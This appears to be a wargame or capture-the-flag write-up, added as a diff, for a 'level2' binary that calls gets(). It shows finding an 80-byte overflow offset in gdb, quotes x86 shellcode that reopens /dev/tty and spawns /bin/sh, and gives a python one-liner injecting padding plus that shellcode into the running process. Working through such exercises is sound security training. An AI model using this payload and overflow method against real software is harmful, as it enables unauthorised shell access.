@@ -1,0 +1,30 @@
+ ▄▄▄▄                                    ▄▄▄▄                 ▄▄▄▄▄
+ ▀▀██                                    ▀▀██                █▀▀▀▀██▄
+   ██       ▄████▄   ██▄  ▄██   ▄████▄     ██                      ██
+   ██      ██▄▄▄▄██   ██  ██   ██▄▄▄▄██    ██                    ▄█▀
+   ██      ██▀▀▀▀▀▀   ▀█▄▄█▀   ██▀▀▀▀▀▀    ██                  ▄█▀
+   ██▄▄▄   ▀██▄▄▄▄█    ████    ▀██▄▄▄▄█    ██▄▄▄             ▄██▄▄▄▄▄
+    ▀▀▀▀     ▀▀▀▀▀      ▀▀       ▀▀▀▀▀      ▀▀▀▀             ▀▀▀▀▀▀▀▀
+
+gdb level2
+disas main shows the exectuables only calls <p> then returns
+<p> calls gets(), -> buffer overflow.
+
+We find the required input for overflow just like in level1:
+
+echo 'run < <(echo {TEST_STRING})' | gdb executables/level2
+> Program received signal SIGSEGV, Segmentation fault.
+> 0x37634136 in ?? ()
+offset: 80
+
+shellcode specially made for gets():
+http://shell-storm.org/shellcode/files/shellcode-219.php
+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+
+./level2
+pid=$(pidof level2)
+sudo gdb -p $pid
+
+python -c "print('A' * 80 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" > /proc/$pid/fd/0
+
+
